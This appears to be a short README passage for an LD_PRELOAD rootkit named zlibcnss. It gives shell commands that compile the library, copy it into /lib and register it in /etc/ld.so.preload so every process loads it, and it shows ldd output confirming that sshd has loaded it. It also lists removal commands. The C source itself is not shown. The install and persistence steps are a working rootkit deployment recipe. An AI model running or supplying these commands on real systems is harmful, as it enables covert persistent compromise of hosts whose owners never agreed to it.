


Compile and install:
```bash
 gcc zlibcnss.c -o zlibcnss.so -fPIC -shared -ldl -D_GNU_SOURCE
 cp zlibcnss.so /lib/
 echo "/lib/zlibcnss.so" > /etc/ld.so.preload
```


## Remove rootkit
Delete `/etc/ld.so.preload` and delete the maliciuos library. 
Nothing else needed.
```bash
rm /etc/ld.so.preload
rm /lib/zlibcnss.so
rm /lib/x86_64-linux-gnu/zlibcnss.so
```



### Verify installation
```bash
ldd /usr/sbin/sshd
	linux-vdso.so.1 (0x00007ffe9214c000)
	/lib/x86_64-linux-gnu/zlibcnss.so (0x00007f17ed354000)
    [...]
```
Also check /etc/ld.so.preload for your entry.
```bash
cat /etc/ld.so.preload 
/lib/x86_64-linux-gnu/zlibcnss.so
```

